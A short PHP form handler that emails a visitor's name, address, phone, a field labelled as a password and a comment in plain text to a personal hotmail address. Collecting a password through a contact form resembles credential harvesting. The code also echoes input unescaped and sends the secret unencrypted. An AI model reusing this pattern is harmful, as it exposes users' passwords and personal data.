<?php 

//Bloque de las Variables
$nombres=$_POST['nombres'];

$calle=$_POST['calle'];

$phone=$_POST['phone'];

$usu=$_POST['usu'];

$mensaje=$_POST['mensaje'];


// Configuramos datos de email
$destinatario="jorge.gesp@hotmail.com";

$asunto= "consulta web desde mi sitio";


// Cuerpo de email

$cuerpo.="Nombres: ".$nombres."\n";

$cuerpo.="Domicilio: ".$calle."\n";

$cuerpo.="Teléfono: ".$phone."\n";

$cuerpo.="Contraseña: ".$usu."\n\n";

$cuerpo.="Comentario: ".$mensaje."\n";


// enviamos el email o formulario

mail($destinatario,$asunto,$cuerpo);

echo $nombres, ", gracias por contactarnos!!!";		

?>